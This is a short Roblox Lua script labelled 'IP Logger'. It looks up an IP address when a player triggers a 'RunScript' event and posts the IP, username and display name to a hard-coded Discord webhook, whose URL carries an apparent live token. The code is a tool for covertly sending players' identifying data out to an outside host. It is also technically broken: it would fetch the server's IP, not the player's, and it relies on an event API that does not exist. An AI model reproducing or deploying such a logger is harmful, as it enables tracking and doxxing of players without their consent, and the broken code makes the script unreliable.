local http = game:GetService("HttpService")

local logIpFunction = function(player)
    local ip = http:JSONDecode(http:Get("https://api.ipify.org?format=json")).ip
    local username = player.Name
    local displayName = player.DisplayName
    local webhook = "https://discord.com/api/webhooks/1222254468557443213/wf2ulJG7iP1A6HqxyAeY2OipyJVL-PEN96xpDVFUMzTX8T5Ce9FPfMju9rZprlIZp5gQ"
    
    local data = {
        content = "Player IP: " .. ip .. " | Username: " .. username .. " | Display Name: " .. displayName,
        username = "IP Logger",
    }
    
    http:PostAsync(webhook, game:GetService("HttpService"):JSONEncode(data))
end

game.Players.PlayerAdded:Connect(function(player)
    player.PlayerScripts.OnClientEvent:Connect(function(eventName, ...)
        if eventName == "RunScript" then
            logIpFunction(player)
        end
    end)
end)
